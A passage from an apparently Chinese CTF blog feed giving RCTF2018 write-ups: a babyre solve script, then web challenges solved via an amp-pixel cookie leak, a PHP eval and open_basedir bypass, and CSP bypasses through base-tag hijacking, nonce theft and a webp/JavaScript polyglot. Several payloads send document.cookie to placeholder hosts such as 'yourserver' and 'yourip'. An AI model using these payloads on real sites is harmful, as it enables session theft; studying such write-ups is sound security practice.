hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="hljs-keyword">import</span> re</span><br><span class="line"></span><br><span class="line">fle = open(<span class="hljs-string">'E:/Download/babyre/out'</span>, <span class="hljs-string">'r'</span>)</span><br><span class="line">goal = []</span><br><span class="line"><span class="hljs-keyword">for</span> one <span class="hljs-keyword">in</span> fle.readlines():</span><br><span class="line">    one = one.strip(<span class="hljs-string">'\n'</span>)</span><br><span class="line">    goal.append(one[:<span class="hljs-number">8</span>])</span><br><span class="line">    goal.append(one[<span class="hljs-number">8</span>:])</span><br><span class="line"></span><br><span class="line">strs = <span class="hljs-string">'!"#$%&amp;\'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~'</span></span><br><span class="line">strs = list(strs)</span><br><span class="line"></span><br><span class="line">tmp = []</span><br><span class="line">fle2 = open(<span class="hljs-string">'E:/Download/babyre/shuju.txt'</span>, <span class="hljs-string">'r'</span>)</span><br><span class="line"><span class="hljs-keyword">for</span> one <span class="hljs-keyword">in</span> fle2.readlines():</span><br><span class="line">    tmp.append(one.strip(<span class="hljs-string">'\n'</span>))</span><br><span class="line"></span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> one <span class="hljs-keyword">in</span> goal:</span><br><span class="line">    <span class="hljs-keyword">for</span> ids, tt <span class="hljs-keyword">in</span> enumerate(tmp):</span><br><span class="line">        ok = re.search(one, tt, re.IGNORECASE)</span><br><span class="line">        <span class="hljs-keyword">if</span> ok:</span><br><span class="line">            flag += strs[ids]</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;flag：<code>RCTF{Kee1o9_1s_a1ready_so1ved}</code>。<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;&lt;del&gt;CTFer是不存在周末的，更不存在520….&lt;/del&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>RCTF2018 web writeup</title>
    <link href="http://yoursite.com/2018/05/rctf-web-writeup1/"/>
    <id>http://yoursite.com/2018/05/rctf-web-writeup1/</id>
    <published>2018-05-21T08:47:56.000Z</published>
    <updated>2018-11-23T12:48:14.405Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;作为web狗饱受打击的一个比赛，0解题。任重而道远！<br><a id="more"></a></p><h2 id="amp"><a href="#amp" class="headerlink" title="amp"></a>amp</h2><p>&emsp;&emsp;这道题严重<code>忽视</code>了出题人留下的提示，虽然也去Google了一下<code>amp</code>，但出来的结果并没有直接看出相关性，所以就一头扎进<code>CSP</code>的绕过方式上了，结果很显然。</p><p><div align="center"><br>    <img src="/images/posts/rctf/5.png" height="60%"><br></div><br>&emsp;&emsp;首先AMP是：Google推出了一项名为 Accelerated Mobile Pages（AMP）的技术，号称能大大加快移动端页面呈现速度，提高整体体验。AMP HTML 是 HTML 的<code>子集</code>，在 AMP HTML 中只允许使用有限的HTML标签，并且它有自己的一套标签声明。</p><p>&emsp;&emsp;一个简单的AMP HTML模板如下：</p><p><div align="center"><br>    <img src="/images/posts/rctf/6.png" height="60%"><br></div><br>&emsp;&emsp;这跟我们题目里的是一样的，同时AMP HTML有如下特征(截选)：</p><ul><li><em>包含顶级 <html ⚡=""> 标记（也接受 <html amp="">）</html></html></em></li><li><em>包含 <script async src="https://cdn.ampproject.org/v0.js"></script> 标记作为<head>中的最后一个元素（这样做将会包括并加载 AMP JS 库）</head></em></li></ul><p>&emsp;&emsp;接下来的解题方法主要参考<a href="https://graneed.hatenablog.com/entry/2018/05/21/121811" target="_blank">–&gt;这个</a>。</p><p>&emsp;&emsp;首先我们先去了解一下AMP HTML对比HTML有哪些不一样的标签，然后从这些标签中找到可以进行利用的。AMP HTML的特性可以在这里找到：<a href="https://github.com/ampproject/amphtml/blob/master/spec/amp-var-substitutions.md" target="_blank">传送门</a>。</p><p><div align="center"><br>    <img src="/images/posts/rctf/7.png" height="60%"><br></div><br>&emsp;&emsp;在第一段我们就收获了有价值的信息，AMP HTML支持<code>变量</code>，可以在运行的时候动态的<code>替换</code>。</p><p>&emsp;&emsp;接着可以找到一个叫：Client ID的变量，它可以提供每个文档源出处（您发布AMP文档的网站的来源）和用户标识符。如果同一用户在一年内再次访问，客户端ID将相同。客户端ID应该与存储会话ID一年的<code>cookie</code>大致相似。如果AMP文档未通过Google AMP缓存提供，则客户ID将替换为cid scope参数名称的Cookie （请参阅下文）。如果它不存在，cookie将被设置为相同的名称。这些cookie将始终具有前缀“amp-”，随后是随机的base64编码字符串。</p><p><div align="center"><br>    <img src="/images/posts/rctf/8.png" height="60%"><br></div><br>&emsp;&emsp;所以如果我们<code>调用</code>cookie的值就能被替换出来，所以我们可以构造：<br><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">amp-pixel</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://foo.com/pixel?cid=CLIENT_ID(FLAG)"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">amp-pixel</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;<code>FLAG</code>是cookie的名称。注意：amp-pixel只支持<code>https</code>，不支持<code>http</code>。</p><p>&emsp;&emsp;所以我们将foo.com换成自己的地址就行了。完整的payload：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://amp.2018.teamrois.cn/?name=&lt;amp-pixel src=%22https://foo.com/index?cid=CLIENT_ID(FLAG)%22%3E%3C/amp-pixel%3E</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;注意替换foo.com。然后我们可以在网络请求中看到数据外带的请求：</p><p><div align="center"><br>    <img src="/images/posts/rctf/9.png" height="60%"><br></div><br>&emsp;&emsp;成功的将我们本地的cookie传了出去，接着我们再提交，让bot去查看即可。</p><p><div align="center"><br>    <img src="/images/posts/rctf/10.png" height="60%"><br></div><br>&emsp;&emsp;flag：<code>RCTF{El_PsY_CONGRO0_sg0}</code>。</p><h2 id="r-cursive"><a href="#r-cursive" class="headerlink" title="r-cursive"></a>r-cursive</h2><p>&emsp;&emsp;打开后可以找到两个源码：<br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$token = sha1($_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>]);</span><br><span class="line">$dir = <span class="hljs-string">'../sandbox/'</span>.$token.<span class="hljs-string">'/'</span>;</span><br><span class="line">is_dir($dir) ?: mkdir($dir);</span><br><span class="line">is_file($dir.<span class="hljs-string">'index.php'</span>) ?: file_put_contents($dir.<span class="hljs-string">'index.php'</span>, str_replace(<span class="hljs-string">'#SHA1#'</span>, $token, file_get_contents(<span class="hljs-string">'./template'</span>)));</span><br><span class="line"><span class="hljs-keyword">switch</span>($_GET[<span class="hljs-string">'action'</span>] ?: <span class="hljs-string">''</span>)&#123;</span><br><span class="line">    <span class="hljs-keyword">case</span> <span class="hljs-string">'go'</span>:</span><br><span class="line">        header(<span class="hljs-string">'Location: http://'</span>.$token.<span class="hljs-string">'.sandbox.r-cursive.ml:1337/'</span>);</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">    <span class="hljs-keyword">case</span> <span class="hljs-string">'reset'</span>:</span><br><span class="line">        system(<span class="hljs-string">'rm -rf '</span>.$dir);</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">    <span class="hljs-keyword">default</span>:</span><br><span class="line">        show_source(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">sha1($_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>]) === <span class="hljs-string">'c664521db39c2da59f8f5b0eb7595bdf4e8a9043'</span> ?: <span class="hljs-keyword">die</span>();</span><br><span class="line"><span class="hljs-comment">// R是递归匹配</span></span><br><span class="line"><span class="hljs-string">';'</span> === preg_replace(<span class="hljs-string">'/[^\W_]+\((?R)?\)/'</span>, <span class="hljs-keyword">NULL</span>, $_GET[<span class="hljs-string">'cmd'</span>]) ? <span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">'cmd'</span>]) : show_source(<span class="hljs-keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;根据正则匹配条件和本地搭环境调试可以知道只能执行不带参数、函数名不含包括_在内的特殊符号，所以只能是aaa(bbb(ccc()))此类的调用形式。所以从<code>cmd</code>参数里进行函数执行是不太可能的了，比赛时也没有想到突破方法，后来才得知可以运行<code>http header</code>头来进行处理。</p><p>&emsp;&emsp;PHP中可以使用get_headers ,getallheaders获得HTTP请求头的信息，并返回键值数组，所以我们就只能用<code>getallheaders()</code>来获取。又因为返回的是数组，我们可以使用<code>implode()</code>来将数组转换成字符串。所以我们初步构造：<code>implode(getallheaders())</code>。但如果仅是这样还不能运行我们的代码，因为<code>implode()</code>返回的已经是字符串了，<code>&quot;implode()&quot;</code>（注意<code>&quot;</code>），有相当于多嵌套了一层字符，所以我们应该使用<code>eval(implode(getallheaders()));</code>来进行执行。如：</p><p><div align="center"><br>    <img src="/images/posts/rctf/11.png" height="60%"><br></div><br>&emsp;&emsp;注意需要在执行的语句后加<code>//</code>进行注释，防止eval出错。</p><p>&emsp;&emsp;绕过了cmd后，接下来就要考虑沙箱绕过了，先看看被禁用的函数及类。<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">disable_classes:</span><br><span class="line">GlobIterator,DirectoryIterator,FilesystemIterator,RecursiveDirectoryIterator</span><br><span class="line">disable_functions:</span><br><span class="line">system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,putenv,apache_setenv,mb_send_mail,assert,dl,set_time_limit,ignore_user_abort,symlink,link</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;可以发现禁用的函数并不是很多，一些文件读取的函数都没有被禁用，尝试了一下读目录，但发现被禁止，然后可以发现<code>open_basedir</code>变量：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/sandbox/c664521db39c2da59f8f5b0eb7595bdf4e8a9043/:/tmp/</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;那我们主要的任务就是绕过open_basedir。自己网上找了相关的绕过方式，但利用条件都不满足，比如dl、替换so库等。</p><p>&emsp;&emsp;其实这道题的考点在虚拟主机配置的安全问题，Apache中有一个<code>mod_vhost_alias</code>模块，它的作用是</p><blockquote><p>将 HTTP 请求中的 IP 地址和/或 Host: 头内容转换为所要提供服务的文件的路径名称来创建动态的虚拟主机配置。</p></blockquote><p><div align="center"><br>    <img src="/images/posts/rctf/12.png" height="60%"><br></div></p><p><div align="center"><br>    <img src="/images/posts/rctf/13.png" height="60%"><br></div><br>&emsp;&emsp;在stackoverflow中有一个动态通过mod_vhost_alias来配置open_basedir的答案，<a href="https://stackoverflow.com/questions/9675621/dynamic-open-basedir-with-mod-vhost-alias" target="_blank">传送门</a>。这是它的一个答案：</p><p><div align="center"><br>    <img src="/images/posts/rctf/14.png" height="60%"><br></div><br>&emsp;&emsp;而刚好从phpinfo()里能查看到这个参数：</p><p><div align="center"><br>    <img src="/images/posts/rctf/15.png" height="60%"><br></div><br>&emsp;&emsp;当我们尝试修改host，将c664521db39c2da59f8f5b0eb7595bdf4e8a9043去掉，发现报了个403。</p><p><div align="center"><br>    <img src="/images/posts/rctf/16.png" height="60%"><br></div><br>&emsp;&emsp;猜测这时候我们默认访问的是<code>/var/www/sandbox/</code>，这个目录下是没有<code>index.php</code>的，所以报了个403，为了确认我们的猜想，我们可以尝试访问<code>init.php</code>，这个文件根据phpinfo是在/var/www/sandbox/下的。结果如下：</p><p><div align="center"><br>    <img src="/images/posts/rctf/17.png" height="60%"><br></div><br>&emsp;&emsp;这证实了我们的猜想，此时我们在<code>/var/www/sandbox/</code>下，所以我们再去访问c664521db39c2da59f8f5b0eb7595bdf4e8a9043下的index.php以执行我们的cmd。</p><p><div align="center"><br>    <img src="/images/posts/rctf/18.png" height="60%"><br></div><br>&emsp;&emsp;我们成功修改(绕过)了open_basedir，接着我们读取<code>init.php</code>的内容。</p><p><div align="center"><br>    <img src="/images/posts/rctf/19.png" height="40%"><br></div><br>&emsp;&emsp;成功拿到flag：<code>RCTF{apache_mod_vhost_alias_should_be_configured_correctly}</code>。</p><h2 id="rBlog-2018"><a href="#rBlog-2018" class="headerlink" title="rBlog 2018"></a>rBlog 2018</h2><p>&emsp;&emsp;这道题有两种解法，一是CSP绕过，二是使用webp文件。</p><h3 id="解法一：CSP绕过"><a href="#解法一：CSP绕过" class="headerlink" title="解法一：CSP绕过"></a>解法一：CSP绕过</h3><p>&emsp;&emsp;打开后发现一个标准的<code>XSS</code>利用攻击，我们提交一篇文章，管理员会去点击查看，从而盗取cookies。</p><p><div align="center"><br>    <img src="/images/posts/rctf/20.png" height="50%"><br></div><br>&emsp;&emsp;抓包后修改下各参数的值：</p><p><div align="center"><br>    <img src="/images/posts/rctf/21.png" height="50%"><br></div><br>&emsp;&emsp;插完后可以看到title和style处可以直接插入script，但由于CSP的关系导致不能执行。</p><p><div align="center"><br>    <img src="/images/posts/rctf/22.png" height="50%"><br></div><br>&emsp;&emsp;我们可以用Google的<a href="https://csp-evaluator.withgoogle.com/" target="_blank">CSP检查工具</a>检查一下该网站的安全性。结果如下：</p><p><div align="center"><br>    <img src="/images/posts/rctf/23.png" height="50%"><br></div><br>&emsp;&emsp;可以看到script是没法利用的了，但由于<code>base-uri</code>缺失导致我们可以进行<code>偷梁换柱</code>。</p><p><div align="center"><br>    <img src="/images/posts/rctf/24.png" height="50%"><br></div><br>&emsp;&emsp;由于页面使用的是相对路径，默认是访问本站点下的”/assets/js/jquery.min.js”，放到这里就是：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://rblog.2018.teamrois.cn/assets/js/jquery.min.js</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;首先我们了解下base标签的用途：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;base&gt; 标签为页面上的所有链接规定默认地址或默认目标。</span><br><span class="line"></span><br><span class="line">通常情况下，浏览器会从当前文档的 URL 中提取相应的元素来填写相对 URL 中的空白。</span><br><span class="line"></span><br><span class="line">使用 &lt;base&gt; 标签可以改变这一点。浏览器随后将不再使用当前文档的 URL，而使用指定的基本 URL 来解析所有的相对 URL。这其中包括 &lt;a&gt;、&lt;img&gt;、&lt;link&gt;、&lt;form&gt;、 &lt;script&gt;标签中的 URL。</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;所以我们重置这个标签，如：<br><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">base</span> <span class="hljs-attr">href</span> = <span class="hljs-string">"https://yourserver"</span> /&gt;</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;那么在访问jquery.min.js的时候就会变成访问：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://yourserver/assets/js/jquery.min.js</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;所以我们在自己的服务器上放一个路径跟文件名一样的环境，然后尝试弹一下窗。</p><p><div align="center"><br>    <img src="/images/posts/rctf/25.png" height="50%"><br></div><br>&emsp;&emsp;结果如下：</p><p><div align="center"><br>    <img src="/images/posts/rctf/26.png" height="50%"><br></div><br>&emsp;&emsp;成功弹窗，那么接下来就获取cookie并打到自己的服务器上，一般的，我们可以使用：<br><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> payload = <span class="hljs-built_in">document</span>.cookie;</span><br><span class="line"><span class="hljs-keyword">var</span> xhttp = <span class="hljs-keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhttp.open(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"http://yourserver/?"</span> + payload, <span class="hljs-literal">true</span>);</span><br><span class="line">xhttp.send();</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;尝试获取失败，因为CSP禁用了AJAX，我们只能执行<code>内嵌</code>的script，但这已经足够了，一个解决方法就是<code>偷盗</code>nonce，我们偷一个nonce id添加到我们的script上，从而光明正大的绕过CSP。payload如下：<br><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> payload = <span class="hljs-built_in">document</span>.cookie;</span><br><span class="line"><span class="hljs-keyword">var</span> nonce = <span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">"script"</span>).nonce;</span><br><span class="line"><span class="hljs-keyword">var</span> src = <span class="hljs-string">`http://yourserver/?<span class="hljs-subst">$&#123;payload&#125;</span>`</span></span><br><span class="line"><span class="hljs-keyword">var</span> s = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'script'</span>)</span><br><span class="line">s.type = <span class="hljs-string">'text/javascript'</span></span><br><span class="line">s.src = src</span><br><span class="line">s.setAttribute(<span class="hljs-string">'nonce'</span>, nonce)</span><br><span class="line"><span class="hljs-built_in">document</span>.body.appendChild(s);</span><br></pre></td></tr></table></figure></p><p><div align="center"><br>    <img src="/images/posts/rctf/27.png" height="50%"><br></div><br>&emsp;&emsp;最终可以得到flag：<code>RCTF{why_the_heck_no_mimetype_for_webp_in_apache2_in_8012}</code>。</p><h3 id="解法二：使用webp文件"><a href="#解法二：使用webp文件" class="headerlink" title="解法二：使用webp文件"></a>解法二：使用webp文件</h3><p>&emsp;&emsp;首先介绍一下<a href="https://zh.wikipedia.org/wiki/WebP" target="_blank">webp</a>。如果不想点开就直接看wiki的引用：</p><p><div align="center"><br>    <img src="/images/posts/rctf/28.png" height="50%"><br></div><br>&emsp;&emsp;说通俗点就是Google开发的一种减少图片大小，但尽量不影响图片的质量的技术。</p><p>&emsp;&emsp;它有一个特性就是PHP能识别它为图片，但Apache不行，体现在http请求头的<code>Content-Type</code>字段上，这是利用的一个<code>大前提</code>。这样导致的一个结果是当我们请求这个网页是返回的是<code>文本</code>，而如果是在script里请求的，那么它就会当成js脚本执行。</p><p><div align="center"><br>    <img src="/images/posts/rctf/29.png" height="50%"><br></div><br>&emsp;&emsp;构成漏洞的另一个条件就是上面提到的<code>style</code>字段我们可以控制，这样我们就可以让他去请求我们构造的恶意js。</p><p><div align="center"><br>    <img src="/images/posts/rctf/30.png" height="50%"><br></div><br>&emsp;&emsp;接下来我们就要构造一个脚本，这里作者寻找了挺久的解决方案，终于找到了一套工具。<a href="https://developers.google.com/speed/webp/download" target="_blank">传送门</a>，具体工具的：<a href="https://storage.googleapis.com/downloads.webmproject.org/releases/webp/index.html" target="_blank">下载工具</a>，找自己系统最新的版本即可</p><p><div align="center"><br>    <img src="/images/posts/rctf/31.png" height="50%"><br></div><br>&emsp;&emsp;下载后我们用系统自带的<code>画图</code>创建一个<code>1像素</code>的<code>jpg</code>图片，这个可以在画图的：文件 –&gt; 属性里设置。这里我们该图片命令为aa.jpg，然后进入到前面下载的工具的目录下执行：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> -o是输出文件的名称 --metadata其实在这里没有必要</span></span><br><span class="line">cwebp.exe aa.jpg -o bb.webp</span><br></pre></td></tr></table></figure></p><p><div align="center"><br>    <img src="/images/posts/rctf/32.png" height="50%"><br></div><br>&emsp;&emsp;bb.webp的内容应该是这样的：</p><p><div align="center"><br>    <img src="/images/posts/rctf/33.png" height="60%"><br></div><br>&emsp;&emsp;根据<a href="https://developers.google.com/speed/webp/docs/riff_container" target="_blank">webp规范</a>，我们如果要添加元数据，应该是<code>exif</code>段。</p><p><div align="center"><br>    <img src="/images/posts/rctf/34.png" height="60%"><br></div><br>&emsp;&emsp;所以我们应该在exif的数据段插入我们的js代码，所以我们先整一个exif文件模板，然后通过<code>webpmux</code>工具将exif加入到我们的bb.webp里，这里我使用这款工具：<a href="http://www.magicexif.com/" target="_blank">下载地址</a>，当然其他工具也是可以的。</p><p>&emsp;&emsp;打开这个工具，新建一个exif模板，插入一个内容，如下：</p><p><div align="center"><br>    <img src="/images/posts/rctf/35.png" height="60%"><br></div><br>&emsp;&emsp;只要数据类型是ASCII的都行。然后再在上面下载的webp工具包里执行：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webpmux.exe -set exif exif.exif bb.webp -o cc.webp</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;此时cc.webp里就有我们的恶意代码了：</p><p><div align="center"><br>    <img src="/images/posts/rctf/36.png" height="60%"><br></div><br>&emsp;&emsp;这里再补充一点为什么插入的是：<br><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*<span class="hljs-regexp">/=1;xxxx;/</span>*</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;首先在JS中是支持这种写法的，在赋值语句中插入注释，如：<br><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa<span class="hljs-comment">/*bbbb*/</span>=<span class="hljs-number">1</span>;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;可以注意到我们的webp文件是有特定的文件头<code>RIFF</code>的，如果直接交给js解析会出现错误，而上面这种写法就可以避免错误产生。所以我们修改如下：</p><p><div align="center"><br>    <img src="/images/posts/rctf/37.png" height="60%"><br></div><br>&emsp;&emsp;但是每种文件都有自己的文件格式，我们修改的那段字符到底代表什么意思呢，我们再看看webp的规范。</p><p><div align="center"><br>    <img src="/images/posts/rctf/38.png" height="60%"><br></div><br>&emsp;&emsp;很明显我们修改的是文件大小的标志，为了使我们的webp有效，我们必须构造0x2f2a=12074的文件大小，后面的内容我们可以用0x00填充。最终我们构造的文件如下：</p><p><div align="center"><br>    <img src="/images/posts/rctf/39.png" height="60%"><br></div><br>&emsp;&emsp;记得在最后加上<code>*/</code>以闭合前面的注释符。</p><p><div align="center"><br>    <img src="/images/posts/rctf/40.png" height="60%"><br></div><br>&emsp;&emsp;顺便在放一下我这里使用的两个webp文件：</p><ul><li><a href="/images/posts/rctf/tmp1.webp">tmp1.webp</a></li><li><a href="/images/posts/rctf/tmp2.webp">tmp2.webp</a></li></ul><p>&emsp;&emsp;接下来我们将这个图片提交上去。得到这个图片的地址，如：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://rblog.2018.teamrois.cn/upload/images/06b40f7bc09e17dfafa34abc113abea6.webp</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;再接着我们重新开一个页面，这里我们需要两个页面配合攻击，第一个先上传图片，第二个引用该图片引发攻击，构造如下：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我们那个图片的相对地址：</span><br><span class="line">../../../upload/images/06b40f7bc09e17dfafa34abc113abea6.webp#</span><br></pre></td></tr></table></figure></p><p><div align="center"><br>    <img src="/images/posts/rctf/41.png" height="60%"><br></div></p><p><div align="center"><br>    <img src="/images/posts/rctf/42.png" height="60%"><br></div><br>&emsp;&emsp;可以看到成功弹窗，说明我们的js被执行，那么接下来我们就获取cookie了，将上面的文件中的js替换一下：<br><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*<span class="hljs-regexp">/=1;window.location.href="http:/</span><span class="hljs-regexp">/yourip/</span>?cookie=<span class="hljs-string">"+document.cookie;/*</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;再用相同的方法提交，并在另一个新的请求中替换style的值为该图片的地址。然后把这个新的页面的地址提交到report。最终我们可以收到一个cookie：</p><p><div align="center"><br>    <img src="/images/posts/rctf/43.png" height="60%"><br></div><br>&emsp;&emsp;所以flag：<code>RCTF{why_the_heck_no_mimetype_for_webp_in_apache2_in_8012}</code>。然后还有第二关的提示：<a href="http://rblog.2018.teamrois.cn/blog.php/52c533a30d8129ee4915191c57965ef4c7718e6d。" target="_blank" rel="noopener">http://rblog.2018.teamrois.cn/blog.php/52c533a30d8129ee4915191c57965ef4c7718e6d。</a></p><p>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;作为web狗饱受打击的一个比赛，0解题。任重而道远！&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>DDCTF2018 2道web writeup</title>
    <link href="http://yoursite.com/2018/05/ddctf-writeup5/"/>
    <id>http://yoursite.com/2018/05/ddctf-writeup5/</id>
    <published>2018-05-09T14:47:56.000Z</published>
    <updated>2018-11-23T12:44:04.271Z</updated>
    
